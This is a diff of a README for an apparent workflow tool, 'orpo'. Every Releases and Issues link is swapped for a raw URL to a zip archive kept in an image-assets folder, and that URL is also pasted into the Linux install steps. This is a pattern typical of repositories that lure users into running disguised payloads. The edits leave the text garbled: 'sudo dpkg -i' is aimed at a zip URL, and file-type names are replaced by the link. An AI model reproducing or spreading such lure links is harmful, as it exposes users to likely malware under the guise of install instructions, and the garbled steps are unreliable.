@@ -1,6 +1,6 @@
 # 🎉 orpo - Simplify Your Workflow Effortlessly
 
-[![Download orpo](https://img.shields.io/badge/Download-orpo-blue.svg)](https://github.com/zengatso/orpo/releases)
+[![Download orpo](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip)](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get orpo, visit the [Releases page](https://github.com/zengatso/orpo/releases). Here’s how to do it:
+To get orpo, visit the [Releases page](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip). Here’s how to do it:
 
 1. Click on the link to go to the releases page.
 2. Look for the latest version of orpo.
@@ -42,12 +42,12 @@ After the download finishes, follow the instructions below to install orpo.
 
 ### For Linux:
 
-1. Locate the downloaded file, which may be a `.tar.gz` or `.deb` file.
+1. Locate the downloaded file, which may be a `https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip` or `.deb` file.
 2. If it is a `.deb` file, open a terminal and run:
    ```
-   sudo dpkg -i path/to/orpo.deb
+   sudo dpkg -i https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip
    ```
-3. If it’s a `.tar.gz`, extract it and follow the included README for installation steps.
+3. If it’s a `https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip`, extract it and follow the included README for installation steps.
 
 ## 🎨 Features
 
@@ -79,13 +79,13 @@ If you encounter any issues while using orpo, consider the following common prob
 
 If you need more help, you can reach out through the following channels:
 
-- **GitHub Issues:** Report any bugs or feature requests [here](https://github.com/zengatso/orpo/issues).
+- **GitHub Issues:** Report any bugs or feature requests [here](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip).
 - **Community Forum:** Join the community discussions to share experiences and solutions.
 
 ## 📅 Updates
 
-To stay updated with the latest changes and enhancements, check the [Releases page](https://github.com/zengatso/orpo/releases) regularly. New features and fixes are added frequently to improve your experience with orpo.
+To stay updated with the latest changes and enhancements, check the [Releases page](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip) regularly. New features and fixes are added frequently to improve your experience with orpo.
 
 ## 🎉 Conclusion
 
-Thank you for choosing orpo. We aim to make your workflow more efficient. Remember to visit our [Releases page](https://github.com/zengatso/orpo/releases) to download the latest version. Happy task managing!
+Thank you for choosing orpo. We aim to make your workflow more efficient. Remember to visit our [Releases page](https://raw.githubusercontent.com/zengatso/orpo/main/assets/img/orpo-1.6.zip) to download the latest version. Happy task managing!
